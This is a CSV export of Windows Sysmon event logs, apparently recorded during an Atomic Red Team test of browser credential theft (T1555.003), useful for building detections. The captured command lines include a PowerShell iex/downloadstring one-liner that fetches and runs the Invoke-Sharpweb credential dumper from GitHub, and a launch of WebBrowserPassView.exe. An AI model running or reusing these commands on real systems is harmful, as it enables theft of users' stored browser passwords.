Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Start-Process \""""C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe\""""
Start-Sleep -Second 4
Stop-Process -Name \""""WebBrowserPassView\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9498,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:37.085

ProcessGuid: {fda94052-41e1-658d-8802-000000000b00}

ProcessId: 8400

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Start-Process \""""C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe\""""
Start-Sleep -Second 4
Stop-Process -Name \""""WebBrowserPassView\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-41e1-658d-8802-000000000b00},7044,8400,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:37.0860924Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:37.085,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:37.0860924Z""/>
      <EventRecordID>9498</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:37.085</Data>
      <Data Name=""ProcessGuid"">{fda94052-41e1-658d-8802-000000000b00}</Data>
      <Data Name=""ProcessId"">8400</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Start-Process \""""C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe\""""
Start-Sleep -Second 4
Stop-Process -Name \""""WebBrowserPassView\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:37.085

ProcessGuid: {fda94052-41e1-658d-8802-000000000b00}

ProcessId: 8400

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Start-Process \""""C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe\""""
Start-Sleep -Second 4
Stop-Process -Name \""""WebBrowserPassView\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:34.925,,,,,,,,,11,9497,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:34.925

ProcessGuid: {fda94052-41de-658d-8602-000000000b00}

ProcessId: 5024

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_odxibjko.3dc.ps1

CreationUtcTime: 2023-12-28 09:37:34.925

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41de-658d-8602-000000000b00},7044,5024,,,,,,"
      ",-,,,,,,2023-12-28T09:37:34.9301019Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_odxibjko.3dc.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.925,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.9301019Z""/>
      <EventRecordID>9497</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.925</Data>
      <Data Name=""ProcessGuid"">{fda94052-41de-658d-8602-000000000b00}</Data>
      <Data Name=""ProcessId"">5024</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_odxibjko.3dc.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:34.925</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:34.925

ProcessGuid: {fda94052-41de-658d-8602-000000000b00}

ProcessId: 5024

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_odxibjko.3dc.ps1

CreationUtcTime: 2023-12-28 09:37:34.925

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command \""""all\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9496,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.800

ProcessGuid: {fda94052-41de-658d-8602-000000000b00}

ProcessId: 5024

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command \""""all\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-41de-658d-8602-000000000b00},7044,5024,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:34.8022217Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.800,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.8022217Z""/>
      <EventRecordID>9496</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.800</Data>
      <Data Name=""ProcessGuid"">{fda94052-41de-658d-8602-000000000b00}</Data>
      <Data Name=""ProcessId"">5024</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command \""""all\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.800

ProcessGuid: {fda94052-41de-658d-8602-000000000b00}

ProcessId: 5024

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command \""""all\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:34.325,,,,,,,,,11,9495,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-28 09:37:34.469

ProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ProcessId: 7860

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.dll

CreationUtcTime: 2023-12-28 09:37:34.325

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41de-658d-8402-000000000b00},7044,7860,,,,,,"
      ",DLL,,,,,,2023-12-28T09:37:34.4796976Z,C:\Users\User\AppData\Local\Temp\rhjykccy.dll,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.469,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.4796976Z""/>
      <EventRecordID>9495</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.469</Data>
      <Data Name=""ProcessGuid"">{fda94052-41de-658d-8402-000000000b00}</Data>
      <Data Name=""ProcessId"">7860</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rhjykccy.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:34.325</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-28 09:37:34.469

ProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ProcessId: 7860

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.dll

CreationUtcTime: 2023-12-28 09:37:34.325

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES65D8.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC6FB6692D7AB3422C85AE9D6291472FAA.TMP""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Resource File To COFF Object Conversion Utility,,,,,,,1,9494,,14.32.31326.0,"MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.464

ProcessGuid: {fda94052-41de-658d-8502-000000000b00}

ProcessId: 6400

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft® Resource File To COFF Object Conversion Utility

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES65D8.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC6FB6692D7AB3422C85AE9D6291472FAA.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ParentProcessId: 7860

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""

ParentUser: WINDEV2309EVAL\User",Info,CVTRES.EXE,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,{fda94052-41de-658d-8402-000000000b00},7860,WINDEV2309EVAL\User,{fda94052-41de-658d-8502-000000000b00},7044,6400,Microsoft® .NET Framework,,,,,"
      ",-,,,,,,2023-12-28T09:37:34.4653048Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.464,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.4653048Z""/>
      <EventRecordID>9494</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.464</Data>
      <Data Name=""ProcessGuid"">{fda94052-41de-658d-8502-000000000b00}</Data>
      <Data Name=""ProcessId"">6400</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe</Data>
      <Data Name=""FileVersion"">14.32.31326.0</Data>
      <Data Name=""Description"">Microsoft&#174; Resource File To COFF Object Conversion Utility</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CVTRES.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES65D8.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC6FB6692D7AB3422C85AE9D6291472FAA.TMP""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-41de-658d-8402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7860</Data>
      <Data Name=""ParentImage"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.464

ProcessGuid: {fda94052-41de-658d-8502-000000000b00}

ProcessId: 6400

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft&#174; Resource File To COFF Object Conversion Utility

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES65D8.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC6FB6692D7AB3422C85AE9D6291472FAA.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ParentProcessId: 7860

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9493,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.911

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T09:37:34.3902457Z,,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:39.911,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.3902457Z""/>
      <EventRecordID>9493</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:39.911</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.911

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
